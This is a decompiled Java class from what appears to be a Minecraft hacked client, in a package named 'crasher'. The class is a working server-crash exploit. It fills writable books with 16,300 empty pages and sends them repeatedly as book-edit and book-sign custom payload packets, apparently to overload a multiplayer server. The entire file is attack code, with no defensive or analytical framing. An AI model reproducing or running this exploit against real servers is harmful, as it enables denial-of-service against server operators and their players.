// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.cpc;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketCustomPayload;
import net.minecraft.client.Minecraft;
import net.minecraft.network.PacketBuffer;
import io.netty.buffer.Unpooled;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Items;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTTagList;

public class CustomPayloadCrasher11
{
    public static void start() {
        for (int j = 0; j < 10; ++j) {
            final NBTTagList bookPages = new NBTTagList();
            for (int i = 0; i < 16300; ++i) {
                bookPages.appendTag(new NBTTagString(""));
            }
            final ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
            bookObj.setTagInfo("pages", bookPages);
            final PacketBuffer bufferbedit = new PacketBuffer(Unpooled.buffer());
            bufferbedit.writeItemStackToBuffer(bookObj);
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketCustomPayload("MC|BEdit", bufferbedit));
            final PacketBuffer bufferbsign = new PacketBuffer(Unpooled.buffer());
            bufferbsign.writeItemStackToBuffer(bookObj);
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketCustomPayload("MC|BSign", bufferbsign));
        }
    }
}
